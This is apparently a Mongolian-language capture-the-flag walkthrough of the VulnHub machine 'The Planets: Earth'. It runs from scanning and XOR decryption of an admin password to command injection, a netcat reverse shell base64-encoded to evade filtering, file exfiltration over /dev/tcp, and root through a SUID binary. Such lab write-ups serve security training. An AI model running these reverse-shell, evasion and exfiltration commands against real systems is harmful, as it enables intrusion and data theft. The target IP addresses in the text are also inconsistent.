![image](https://github.com/Bultuush/Machine/assets/129934501/ac6d2c1d-47cd-4328-a881-ada537ee8043)# Machine1 "THE PLANETS: EARTH"
1. Target-ын мэдэээл авах netdiscover командыг хийснээр бидний зорилтот IP гэж юу болохыг харах боломжтой
![1](https://github.com/Bultuush/Machine/assets/129934501/baf59437-0b31-484f-93a3-d8f46e00e7b3)
Target-ын IP хаяг 192.168.56.103
![image](https://github.com/Bultuush/Machine/assets/129934501/6156076b-0be7-40cc-a88d-2e48fc7156a9)
**nmap -sV 192.168.10.13**
-sV --> Энэ сонголт нь Nmap-д хувилбар илрүүлэхийг хэлдэг.
![image](https://github.com/Bultuush/Machine/assets/129934501/c3650dd7-fef8-48d7-9ad0-43d3cb26508c)
Би энд нэмсэн -p- - бүх портуудыг скан, -v - дэлгэрэнгүй горимыг сканнерын явцын талаар мэдээлэл авах боломжтой.
22,80, 443 гэсэн 3 порт нээлттэй байгааг бид харж байна. Энэ портуудын ажиллаж байгаа үйлчилгээ эмзэг байгаа эсэхийг шалгах нь үргэлж сайн арга тул https://www.exploit-db.com/ хаягийг шалгана уу. Гэхдээ энэ тохиолдолд мөлжлөг илрээгүй.
Дараа нь яах вэ? Мөнгөн усны хайрцагт байгаа шиг Dirb-ийг ашиглацгаая https://medium.com/@wiktorderda/vulnhub-the-planets-mercury-ctf-10c35ab7607d
![image](https://github.com/Bultuush/Machine/assets/129934501/a3e3120f-58f6-4206-a517-3bcec230a1af)
Ажиллуулах command:
**dirb http://192.168.10.13**
Та үгийн жагсаалтыг зааж өгөх шаардлагагүй - энэ нь анхдагчаар common.txt байна, гэхдээ хэрэв та хүсвэл үүнийг өөр зүйл болгон өөрчилж болно.
Энэ тохиолдолд dirb зөвхөн /cgi-bin олддог. Үүнд хандах боломжтой эсэхийг шалгацгаая:
![image](https://github.com/Bultuush/Machine/assets/129934501/dc42648e-182f-4d6b-a87f-eb87b7eaf8e0)
Иймд хандах боломжгүй, мөн http://192.168.10.13 руу очвол бид Муу хүсэлт(400) алдаа авах болно. Гэсэн хэдий ч бидэнд 443 порт нээлттэй байгаа тул https://192.168.10.13-ээр дамжуулан сайт руу орвол юу болохыг шалгацгаая.
![image](https://github.com/Bultuush/Machine/assets/129934501/32d4226a-4436-4dd5-8408-e73f55088f66)
Бидэнд Fedora админ хуудас байгаа ч үнэхээр хэрэгтэй зүйл байхгүй. Гэсэн хэдий ч бид зорилтот талаараа ямар нэг зүйлийг олох хэрэгтэй, энэ бол бидний авсан цорын ганц зөвлөгөө бөгөөд мэдээлэл нь хаа нэгтээ байх ёстой
Сайтын SSL сертификатыг шалгаад та дараах мэдээллийг авах болно.
![image](https://github.com/Bultuush/Machine/assets/129934501/d9371d99-672a-4a87-83d0-5e5048235dc6)
Тиймээс бид Дэлхий хуудсыг амжилттай харахын тулд Кали хайрцагт байхгүй байгаа DNS нэрийг харж болно.
![image](https://github.com/Bultuush/Machine/assets/129934501/65b2673c-092c-4417-b7de-847c2fa1efe2)
Run command :
**echo "192.168.10.13 earth.local" >> /etc/hosts
echo "192.168.10.13 terratest.earth.local" >> /etc/hosts**

За, үүний дараа хуудсууд хэрхэн харагдахыг харцгаая, дэлхий рүү яв. local-ыг шалгана уу
![image](https://github.com/Bultuush/Machine/assets/129934501/5c322281-0302-462d-a660-96173edc44e2)
Хуудсууд өөр өөр харагдаж байгааг та харж байгаа тул бид зурвасын хайрцаг болон доод хэсэгт зарим мессежийг авсан
![image](https://github.com/Bultuush/Machine/assets/129934501/1f3f391d-f758-4777-a934-3a5a4482aee4)
#**Хэрэглэгчийн нууц үгийг авч байна**

За, бидэнд байгаа ч энэ нь юу болохыг мэдэхгүй байгаа тул далд сангуудыг дахин хайхын тулд dirb-г дахин ажиллуулах нь зүйтэй.
![image](https://github.com/Bultuush/Machine/assets/129934501/a34738cf-d010-4832-a9a5-4ea54c72b9ba)
![image](https://github.com/Bultuush/Machine/assets/129934501/7fbe1214-c104-4cfc-9386-bd71925f837b)
Ажиллуулах тушаал:
**dirb http://earth.local
dirb https://terratest.earth.local**

Одоо хараарай, би http://terratest.earth.local-г ажиллуулахдаа earth.local-тай ижил үр дүн авсан тул оронд нь https:// нэмэх шаардлагатай болсон.
Бидэнд ямар лавлахууд онцгой сонирхолтой болохыг харж болно.
Earth.local-д бид /admin, terratest.earth.local-д /index.html болон /robots.txt байна.
Хөтөч дээр https://terratest.earth.local/robots.txt гэж бичээд robots.txt-г нээнэ үү.
![image](https://github.com/Bultuush/Machine/assets/129934501/3c076bdd-57f9-4b1c-88ee-21affd222f38)
Бид testingnotes.txt гэсэн нэг сонирхолтой нэмэлттэй txt файлтай болсон
Тиймээс бид үүнийг нээгээд дараах зүйл гарч ирнэ.
![image](https://github.com/Bultuush/Machine/assets/129934501/21df813f-c5f8-45bc-8db3-a07a50f1334b)
XOR шифрлэлт нь дэлхийн үндсэн хуудсан дээр бидний харсан мессежүүдийг шифрлэхэд ашиглагдаж байсныг бид мэднэ! Хэрэв та анхааралтай уншвал: testdata.txt нь шифрлэлтийг шалгахад ашиглагдаж байсан тул testdata.txt файлыг нээх боломжтой эсэхийг харцгаая.
![image](https://github.com/Bultuush/Machine/assets/129934501/dda25335-0a85-4fa7-a39a-6eb3a1db458c)
За - энэ хүртэл бидэнд байгаа бүх зүйлийг нэгтгэн дүгнэвэл:

Бид testingnotes.txt-аас terra <- гэсэн хэрэглэгчийн нэртэй
* Бидэнд earh.local хуудаснаас шифрлэгдсэн мессеж байна
* Бидэнд testdata.txt гэсэн шифрлэлтийн түлхүүр байгаа бөгөөд мессежийг тайлахад ашиглаж болно
* Earth.local/admin-д админ хуудас байдгийг бид мэдэж байгаа тул мессежийн кодыг тайлахдаа түүн рүү нэвтрэх арга замыг олж мэдэх боломжтой.
Ингээд CyberChef-д очоод мессежүүд нь юу болохыг харцгаая!
https://gchq.github.io/CyberChef/
![image](https://github.com/Bultuush/Machine/assets/129934501/ec0b20d3-312c-4557-bf67-0bec1f4cbbee)
Бид testdat-г түлхүүр болгон оруулаад үндсэн хуудаснаас мессежийг оруулга руу хуулна.
Хоол хийцгээе! Бид terra дансны нууц үгтэй!
Earth.local/admin руу ороод нэвтэрнэ үү.
Одоо бид хайрцаг дээрх тушаалуудыг гүйцэтгэж болно!
![image](https://github.com/Bultuush/Machine/assets/129934501/af57d087-bbef-4812-a68f-9eb62cd0f00b)
![image](https://github.com/Bultuush/Machine/assets/129934501/40724b4d-f66a-4228-be77-7ebaaeb119dc)
Командыг ажиллуулна уу:
**cd /гэр; ls -al;pwd**
Үүнээс бид хавтас /home болон user earth байгааг харж болно
![image](https://github.com/Bultuush/Machine/assets/129934501/92a4d335-7346-40f9-8839-30b70fc0e844)
Гэсэн хэдий ч тушаалыг ажиллуулна уу
**ls /var/earth_web/**
Далбаа нуугдсан earth_web хавтсыг шалгахын тулд. Туг хаана байгааг би яаж мэдэх вэ? Би зүгээр л ls командын тусламжтайгаар фолдеруудыг хавтас тус бүрээр нь тоолж, хавтаснуудын агуулгыг шалгадаг.
![image](https://github.com/Bultuush/Machine/assets/129934501/d43e8a42-d0c4-4f5d-a3f5-8667bf861f79)
![image](https://github.com/Bultuush/Machine/assets/129934501/07ab64a7-8e6f-4c15-93f6-b60f54c4bd8f)
За, бидэнд хэрэглэгчийн flag байна. Үндсэн flag-ийг хэрхэн олж авах вэ?
# Зорилтот системд холбогдож байна
Тиймээс зорилтот компьютерт холбогдох хамгийн үр дүнтэй арга бол netcat сонсогч ашиглах явдал юм.
CLI командын цонхонд тушаалыг ажиллуулна уу:
**nc -e /bin/bash 192.168.56.101 4444**
Энд 4444 нь манай netcat холболтын портын дугаар юм. Run командыг дарахаас өмнө терминал дээр дараах тушаалыг гүйцэтгэнэ.
**nc -lvnp 4444**
![image](https://github.com/Bultuush/Machine/assets/129934501/c6d486b5-2b2a-4ddd-87e1-cf0a3d10da7b)
Run командын товчийг дарахаас өмнө таны дэлгэц иймэрхүү харагдах ёстой.
Дарсан уу? Тэгээд одоо яах вэ? Зорилтот компьютерээс алсаас холбогдохыг зөвшөөрөөгүй тул амжилтгүй болсон. Гэсэн хэдий ч бид зорилтот машиныг хууран мэхэлж, хүссэн зүйлээ хийх боломжтой. Бид тушаалыг шифрлээд, түүнийг тайлж, нэгэн зэрэг ажиллуулахыг албадах хэрэгтэй.
Эхлээд бид netcat listener командын шифрийг тайлах хэрэгтэй бөгөөд энэ нь:
**nc -e /bin/bash 192.168.56.101 4444**
Терминал цонхыг нээгээд доорх тушаалыг ажиллуулна уу:
**echo 'nc -e /bin/bash 192.168.56.101 4444' | base64**
Үүний үр дүн нь кодлогдсон netcat тушаал болох тэмдэгтүүдийн санамсаргүй мөр байх болно
![image](https://github.com/Bultuush/Machine/assets/129934501/6b8ce564-8ce4-4f28-83ab-acfcafcc3669)
CLI команд руу хуулсан хатгалттай бол үүнийг ажиллуулна уу:
**echo 'өөрийн_кодлогдсон_мөрийг_энд_тавих' | base64 -d | bash**
**d** нь код тайлахад зориулагдсан
bash нь энэ командыг скрипт болгон ажиллуулахыг албадах зориулалттай
![image](https://github.com/Bultuush/Machine/assets/129934501/170f15e6-7f45-44b1-a3c7-042650b88a16)
![image](https://github.com/Bultuush/Machine/assets/129934501/183fdb0d-e5b8-4087-bf57-1898c8c2d4ca)
Run команд дээр дарвал сервер хэсэг хугацаанд зогсох боловч netcat сонсогчийг харна уу. Бид холболттой болсон.
# Үндсэн бүртгэл авч байна
Эхний команд нь whoami бөгөөд энэ нь биднийг "апачи" гэдгийг харуулж байна.
За, одоо яах вэ? Бид сул файлын зөвшөөрлийг хайх болно. Энэ нь бид apache хэрэглэгчийн root эрхээр ажиллуулж болох файл хайж байна гэсэн үг.
Бид энэ командыг ажиллуулах хэрэгтэйг олж мэдэхийн тулд (энэ нь ашиглаж болох эдгээр эмзэг байдлыг олоход тань туслах маш хэрэгтэй команд бөгөөд үүнийг хадгалаарай!)
**Find / -perm -u=s -type f 2>/dev/null**
![image](https://github.com/Bultuush/Machine/assets/129934501/a0063914-410e-413b-9749-26067c28e44c)
Тиймээс reset_root файлыг шалгая, сонирхолтой харагдаж байна. Эхлээд файлын мэдээллийг шалгаад дараа нь файлыг ажиллуулахыг оролдож болно.
Мэдээллийг шалгахын тулд **/usr/bin/reset_root** файлыг ажиллуул
Файлыг ажиллуулахын тулд: **reset_root**-г ажиллуулна уу
![image](https://github.com/Bultuush/Machine/assets/129934501/3634cbbf-9889-4974-acdf-de407747ff7e)
![image](https://github.com/Bultuush/Machine/assets/129934501/12748f64-4a5f-4ea8-a61a-9691a96d73f0)

За, одоо байгаа шиг файлыг гүйцэтгэх боломжгүй байгаа нь тодорхой байна, бид үүнийг хийх явцад алдаа гарлаа, бид netcat-ээр файлд дүн шинжилгээ хийх боломжгүй байна. Бид бусад хэрэгслийг ашиглахын тулд файлыг Кали руу илгээх хэрэгтэй.
# Файлыг netcat-ээр хэрхэн илгээх вэ?
Кали дээрх өөр терминал дээр өөр netcat сонсогчийг эхлүүлээрэй
Энэ командыг ажиллуулна уу: **nc -lvnp 3333 > reset_root**
Бид зорилтот систем дээр байгаа нөгөө netcat сесс дээр
Командыг ажиллуулна уу: **cat /usr/bin/reset_root > /dev/tcp/192.168.56.101 3333**
![image](https://github.com/Bultuush/Machine/assets/129934501/2ef29652-0399-41cc-a75e-4bba0dd320d4)

![image](https://github.com/Bultuush/Machine/assets/129934501/6535e0ec-9d6f-4021-aaa9-8d7fb217d53a)

Манай системд файл байгаа

![image](https://github.com/Bultuush/Machine/assets/129934501/754f26de-304b-4f74-8646-356ff2052f96)

Энгийн cat командыг ажиллуулж файлыг шалгацгаая
![image](https://github.com/Bultuush/Machine/assets/129934501/55033235-1acf-4a49-80bd-30154f6ff59a)
Мөн зохих хэрэгсэлгүйгээр бид юу нь буруу, яагаад файлыг зорилтот систем дээр ажиллуулах боломжгүй байгааг тодорхойлох боломжгүй хэвээр байна. Бид ltrace хэмээх хэрэгслийг суулгах ёстой. Хэрэв танд байхгүй бол y дээр дарж зөвшөөрч суулгана уу.
Одоо бид файлын агуулгыг харж болно, тушаалыг ажиллуулна уу:
**ltrace ./reset_root**
![image](https://github.com/Bultuush/Machine/assets/129934501/84340cd3-389c-4e0c-a7b2-9d574e2c0c77)

Файлыг зөв ажиллуулахын тулд дутуу байгаа 3 файлыг тодруулсан. Тиймээс бид эдгээр файлуудыг зорилтот систем дээрх netcat холболтоор үүсгэх хэрэгтэй. Манай netcat сонсогч руу буцаж шилжиж, дутуу байгаа файлуудыг үүсгэнэ үү
![image](https://github.com/Bultuush/Machine/assets/129934501/b145e88f-42ee-43f3-8830-8fd61d27dad3)

Энэ файлуудыг үүсгэхийн тулд: touch + filepath (ltrace үр дүнгээс хуулсан) командыг ажиллуулаад Enter дарна уу.
reset_root файлыг ажиллуул!
![image](https://github.com/Bultuush/Machine/assets/129934501/47839843-c43e-4a69-961d-b4202285795e)

Агуу их! Бид файлыг ажиллуулсан бөгөөд одоо үндсэн нууц үгийг "Дэлхий" болгож шинэчиллээ.
Энэ командыг ажиллуулж root бүртгэл рүү шилжье: **su root**
![image](https://github.com/Bultuush/Machine/assets/129934501/01de08d5-f288-4a68-a1a3-57034e630bb7)

Одоо та үндсэн flag-ийг хайх хэрэгтэй
![image](https://github.com/Bultuush/Machine/assets/129934501/d8d3b369-cfb5-4963-a9cf-f52f150bc429)

Эцэст нь энэ нь хийгдсэн! Энэ нь амаргүй байсан ч бид зарим нэг заль мэх хийх хэрэгтэй. Энэ нь эхний хайрцгаас илүү хэцүү гэж би хэлэх болно, гэхдээ энэ нь жагсаалтын сүүлчийн гараг болох Сугар гарагаас илүү хялбар байх болно. Танд алхалт таалагдсан гэж найдаж байна.
